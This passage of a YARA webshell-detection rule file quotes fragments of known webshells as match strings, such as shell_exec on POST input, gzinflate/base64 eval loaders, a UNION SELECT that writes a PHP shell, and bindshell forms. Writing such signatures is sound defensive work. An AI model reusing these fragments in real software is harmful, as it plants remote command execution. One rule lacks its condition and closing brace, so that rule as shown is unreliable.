		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash4 = "09609851caa129e40b0d56e90dfc476c"

	strings:
		$s0 = "if ($total === FALSE) {$total = 0;}" fullword
		$s1 = "$free_percent = round(100/($total/$free),2);" fullword
		$s2 = "if (!$bool) {$bool = is_dir($letter.\":\\\\\");}" fullword
		$s3 = "$bool = $isdiskette = in_array($letter,$safemode_diskettes);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE__R577_Php_Php_R57_Php_Php_Spy_Php_Php_S_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "022d2255-50cd-500b-8d91-8e34f3c46fcf"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5503-L5519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "7ba3d6927dc06bfcd98ee9d7146164ca9a9024ef26eac60fabc8ed1375db618d"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"

	strings:
		$s0 = "$res = mssql_query(\"select * from r57_temp_table\",$db);" fullword
		$s2 = "'eng_text30'=>'Cat file'," fullword
		$s3 = "@mssql_query(\"drop table r57_temp_table\",$db);" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE__Nixrem_Php_Php_C99Shell_V1_0_Php_Php_C99Php_NIX_REMOTE_WEB_SHELL_V_0_5_Alpha_Lite_Public_Version_Php
{
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5520-L5537"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f7575db2c8f147d03d5b93b431d1a73c4182b5db6e801e672914778b2042a712"
		score = 75
		quality = 85
		tags = ""
		super_rule = 1
		hash0 = "40a3e86a63d3d7f063a86aab5b5f92c6"
		hash1 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash2 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash3 = "f3ca29b7999643507081caab926e2e74"

	strings:
		$s0 = "$num = $nixpasswd + $nixpwdperpage;" fullword
		$s1 = "$ret = posix_kill($pid,$sig);" fullword
		$s2 = "if ($uid) {echo join(\":\",$uid).\"<br>\";}" fullword
		$s3 = "$i = $nixpasswd;" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Darksecurityteam_Webshell
{
	meta:
		description = "Dark Security Team Webshell"
		author = "Florian Roth (Nextron Systems)"
		id = "78dcd62f-9215-5571-a5ef-5f811ce9672f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5541-L5553"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "f1c95b13a71ca3629a0bb79601fcacf57cdfcf768806a71b26f2448f8c1d5d24"
		logic_hash = "0c58ed8845cb04d785322b280647d424e1028a3be7e92b2493fd907fae36b16d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "form method=post><input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))><input name=thePath value=\"\"\"&HtmlEncode(Server.MapPath(\".\"))&" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_PHP_Cloaked_Webshell_Superfetchexec
{
	meta:
		description = "Looks like a webshell cloaked as GIF - http://goo.gl/xFvioC"
		author = "Florian Roth (Nextron Systems)"
		id = "4611129a-9865-5603-b1ec-7db0058a80d7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "http://goo.gl/xFvioC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5555-L5567"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "320b85b1ad39a90578f53c69838b6264af1e6a71c509aefc0986c7f0c77fdae9"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);"

rule SIGNATURE_BASE_Webshell_Remexp_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file RemExp.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "274c8816-2711-5f12-937e-549ec2d57ce1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5571-L5586"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d9919dcf94a70d5180650de8b81669fa1c10c5a2"
		logic_hash = "b3cfa44898629ffa20630436ae10a94ad72f0e793d61e1157a4de649aa048fe2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lsExt = Right(FileName, Len(FileName) - liCount)" fullword
		$s7 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
		$s13 = "Response.Write Drive.ShareName & \" [share]\"" fullword
		$s19 = "If Request.QueryString(\"CopyFile\") <> \"\" Then" fullword
		$s20 = "<td width=\"40%\" height=\"20\" bgcolor=\"silver\">  Name</td>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Simattacker
{
	meta:
		description = "PHP Webshells Github Archive - file simattacker.php"
		author = "Florian Roth (Nextron Systems)"
		id = "2408fad8-780f-50de-a309-99d14a1d87b6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5604-L5622"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "258297b62aeaf4650ce04642ad5f19be25ec29c9"
		logic_hash = "323b68f1d31df647775ad16a85b9f90bce4eac89188160a1e4853f8fec680160"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$from = rand (71,1020000000).\"@\".\"Attacker.com\";" fullword
		$s4 = "&nbsp;Turkish Hackers : WWW.ALTURKS.COM <br>" fullword
		$s5 = "&nbsp;Programer : SimAttacker - Edited By KingDefacer<br>" fullword
		$s6 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "&nbsp;e-mail : kingdefacer@msn.com<br>" fullword
		$s17 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s18 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s20 = "$Comments=$_POST['Comments'];" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Ironshell_4
{
	meta:
		description = "PHP Webshells Github Archive - file ironshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "06e87e02-372b-5d4e-be52-5515a068665b"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_ironshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5642-L5661"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d47b8ba98ea8061404defc6b3a30839c4444a262"
		logic_hash = "1810071f261ad7390532b07ef24115726f236131aa8ffd29adbde9ebe5085e9d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>'.getenv(\"HTTP_HOST\").' ~ Shell I</title>" fullword
		$s2 = "$link = mysql_connect($_POST['host'], $_POST['username'], $_POST"
		$s4 = "error_reporting(0); //If there is an error, we'll show it, k?" fullword
		$s8 = "print \"<form action=\\\"\".$me.\"?p=chmod&file=\".$content.\"&d"
		$s15 = "if(!is_numeric($_POST['timelimit']))" fullword
		$s16 = "if($_POST['chars'] == \"9999\")" fullword
		$s17 = "<option value=\\\"az\\\">a - zzzzz</option>" fullword
		$s18 = "print shell_exec($command);" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Indexer_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file indexer.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "d6e17429-1b58-5a1b-846d-f5dbfd74cf3a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5662-L5678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e9a7aa5eb1fb228117dc85298c7d3ecd8e288a2d"
		logic_hash = "c576925c95b5bd2549e8039a1fc6ac228bfab5ddee8c4e12264ea78e9828ba5c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword
		$s1 = "<title>WwW.SaNaLTeRoR.OrG - inDEXER And ReaDer</title>" fullword
		$s2 = "<form action=\"?Gonder\" method=\"post\">" fullword
		$s4 = "<form action=\"?oku\" method=\"post\">" fullword
		$s7 = "var message=\"SaNaLTeRoR - " fullword
		$s8 = "nDexEr - Reader\"" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Toolaspshell
{
	meta:
		description = "PHP Webshells Github Archive - file toolaspshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "016af030-4991-583c-aab5-a2933ae0eeec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5679-L5692"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "11d236b0d1c2da30828ffd2f393dd4c6a1022e3f"
		logic_hash = "cb46d3170a9c144a22ef8c91b381495a471d2aa178a4a123eb9a1e32e1db7683"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "cprthtml = \"<font face='arial' size='1'>RHTOOLS 1.5 BETA(PVT) Edited By KingDef"
		$s12 = "barrapos = CInt(InstrRev(Left(raiz,Len(raiz) - 1),\"\\\")) - 1" fullword
		$s20 = "destino3 = folderItem.path & \"\\index.asp\"" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_B374K_Mini_Shell_Php_Php
{
	meta:
		description = "PHP Webshells Github Archive - file b374k-mini-shell-php.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d5b0dfa5-46b5-5323-a8e8-b119d8c2c8e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5693-L5706"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "afb88635fbdd9ebe86b650cc220d3012a8c35143"
		logic_hash = "553bd775d9662f9410d9ab946ccffe4b2ee92e367bcc6345fa595527653280cf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@error_reporting(0);" fullword
		$s2 = "@eval(gzinflate(base64_decode($code)));" fullword
		$s3 = "@set_time_limit(0); " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_B374K_Php
{
	meta:
		description = "PHP Webshells Github Archive - file b374k.php.php"
		author = "Florian Roth (Nextron Systems)"
		id = "73eb7d8d-14bb-5bc2-90b2-90b6bd603bd1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5723-L5738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "04c99efd187cf29dc4e5603c51be44170987bce2"
		logic_hash = "f44ecdcf327cf417a90a91c8d23f6137b80c2006bea2ca2e214f2bfdf5793771"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "// encrypt your password to md5 here http://kerinci.net/?x=decode" fullword
		$s6 = "// password (default is: b374k)"
		$s8 = "//******************************************************************************"
		$s9 = "// b374k 2.2" fullword
		$s10 = "eval(\"?>\".gzinflate(base64_decode("

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend
{
	meta:
		description = "PHP Webshells Github Archive - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3e0bae7d-77a1-5439-bbe7-177bec23cea0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5739-L5756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6454cc5ab73143d72cf0025a81bd1fe710351b44"
		logic_hash = "63ebb0c673a5aee05d2d9d571ebf63942d826b5148a5f7ed587ba1efbb0dc923"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "&nbsp;Iranian Hackers : WWW.SIMORGH-EV.COM <br>" fullword
		$s5 = "//fake mail = Use victim server 4 DOS - fake mail " fullword
		$s10 = "<a style=\"TEXT-DECORATION: none\" href=\"http://www.simorgh-ev.com\">" fullword
		$s16 = "error_reporting(E_ERROR | E_WARNING | E_PARSE);" fullword
		$s17 = "echo \"<font size='1' color='#999999'>Dont in windows\";" fullword
		$s19 = "$Comments=$_POST['Comments'];" fullword
		$s20 = "Victim Mail :<br><input type='text' name='to' ><br>" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Myshell
{
	meta:
		description = "PHP Webshells Github Archive - file MyShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5775-L5793"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "42e283c594c4d061f80a18f5ade0717d3fb2f76d"
		logic_hash = "2c39ffecb44ce2f936ba3563c6086d8b2ed75aec3b57b45e2a1f5e7321ac9a3f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<title>MyShell error - Access Denied</title>" fullword
		$s4 = "$adminEmail = \"youremail@yourserver.com\";" fullword
		$s5 = "//A workdir has been asked for - we chdir to that dir." fullword
		$s6 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
		$s13 = "#$autoErrorTrap Enable automatic error traping if command returns error." fullword
		$s14 = "/* No work_dir - we chdir to $DOCUMENT_ROOT */" fullword
		$s19 = "#every command you excecute." fullword
		$s20 = "<form name=\"shell\" method=\"post\">" fullword

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Reader_Asp_Php
{
	meta:
		description = "PHP Webshells Github Archive - file reader.asp.php.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "80ec18e1-6f41-5188-b2d5-f4228c975fa1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5811-L5825"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "70656f3495e2b3ad391a77d5208eec0fb9e2d931"
		logic_hash = "6ffda38584b6cdec818af8e09c62bb4a46f40230ffd5c1a68993a91c37f67680"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "ster\" name=submit> </Font> &nbsp; &nbsp; &nbsp; <a href=mailto:mailbomb@hotmail"
		$s12 = " HACKING " fullword
		$s16 = "FONT-WEIGHT: bold; BACKGROUND: #ffffff url('images/cellpic1.gif'); TEXT-INDENT: "
		$s20 = "PADDING-RIGHT: 8px; PADDING-LEFT: 8px; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKG"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Webshell_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_2
{
	meta:
		description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b647f529-be81-51ad-b671-84aec410e133"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5844-L5860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
		logic_hash = "92bfac3516a448bbb3e78cf8950c6e816bf35d0ae2f3d32bc9b9b2836309999b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
		$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
		$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
		$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
		$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_PHP_Backdoor_2
{
	meta:
		description = "PHP Webshells Github Archive - file php-backdoor.php"
		author = "Florian Roth (Nextron Systems)"
		id = "65e1305b-4fc7-5885-b3df-92846bb57fe3"
		date = "2025-03-29"
		modified = "2025-03-29"
		old_rule_name = "WebShell_php_backdoor"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5861-L5877"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b190c03af4f3fb52adc20eb0f5d4d151020c74fe"
		logic_hash = "4228bcbfff5d7756615347196270f7916843e2aceacc7298610070b8b923381b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=/etc on *nix" fullword
		$s6 = "// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombi"
		$s11 = "if(!isset($_REQUEST['dir'])) die('hey,specify directory!');" fullword
		$s13 = "else echo \"<a href='$PHP_SELF?f=$d/$dir'><font color=black>\";" fullword
		$s15 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Phpinj
{
	meta:
		description = "PHP Webshells Github Archive - file pHpINJ.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5896-L5913"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "75116bee1ab122861b155cc1ce45a112c28b9596"
		logic_hash = "271efaa8f370376f971d3d59256658b341599ac554cc216e09401e44b16bdede"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword
		$s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword
		$s11 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 IN"
		$s13 = "Full server path to a writable file which will contain the Php Shell <br />" fullword
		$s14 = "$expurl= $url.\"?id=\".$sql ;" fullword
		$s15 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword
		$s16 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_NGH
{
	meta:
		description = "PHP Webshells Github Archive - file NGH.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5914-L5931"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c05b5deecfc6de972aa4652cb66da89cfb3e1645"
		logic_hash = "572b026545b012951136bdb9b1101e38f27bc3321b895799bc853ea1190877f9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<title>Webcommander at <?=$_SERVER[\"HTTP_HOST\"]?></title>" fullword
		$s2 = "/* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */" fullword
		$s5 = "<form action=<?=$script?>?act=bindshell method=POST>" fullword
		$s9 = "<form action=<?=$script?>?act=backconnect method=POST>" fullword
		$s11 = "<form action=<?=$script?>?act=mkdir method=POST>" fullword
		$s16 = "die(\"<font color=#DF0000>Login error</font>\");" fullword
		$s20 = "<b>Bind /bin/bash at port: </b><input type=text name=port size=8>" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_Webshells_Matamu
{
	meta:
		description = "PHP Webshells Github Archive - file matamu.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5932-L5948"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d477aae6bd2f288b578dbf05c1c46b3aaa474733"
		logic_hash = "c0101dab5fe7c3a2652b2e23e1ef0274364137895a402a0367c6b5474c0e8a1f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "$command .= ' -F';" fullword
		$s3 = "/* We try and match a cd command. */" fullword
		$s4 = "directory... Trust me - it works :-) */" fullword
		$s5 = "$command .= \" 1> $tmpfile 2>&1; \" ." fullword
		$s10 = "$new_dir = $regs[1]; // 'cd /something/...'" fullword
		$s16 = "/* The last / in work_dir were the first charecter." fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Hiddens_Shell_V1
{
	meta:
		description = "PHP Webshells Github Archive - file hiddens shell v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "7194998e-c84c-5f59-92fe-857ecf7e8e88"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5965-L5976"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1674bd40eb98b48427c547bf9143aa7fbe2f4a59"
		logic_hash = "b76400c320e6294b0c831fbbb8e08a9d2097fbb027065f9c4b496d4b005ba016"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_C99_Madnet
{
	meta:
		description = "PHP Webshells Github Archive - file c99_madnet.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f2b9c3d1-1c55-59cb-a9bf-8b4011f86a3b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L5977-L5992"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "17613df393d0a99fd5bea18b2d4707f566cff219"
		logic_hash = "cd4048f28405f106302643656ae5f8a257aaec0184a8057a9dffbda9bb857027"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$md5_pass = \"\"; //If no pass then hash" fullword
		$s1 = "eval(gzinflate(base64_decode('"
		$s2 = "$pass = \"pass\";  //Pass" fullword
		$s3 = "$login = \"user\"; //Login" fullword
		$s4 = "             //Authentication" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jspwebshell_1_2
{
	meta:
		description = "PHP Webshells Github Archive - file JspWebshell_1.2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "dfd8c88d-4fe2-5786-9d71-65dba525c358"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L6009-L6025"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0bed4a1966117dd872ac9e8dceceb54024a030fa"
		logic_hash = "13e696c1c671d7fda832c84f150e3f41ed55bf888c4bebfeb06ea68d6be65527"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword
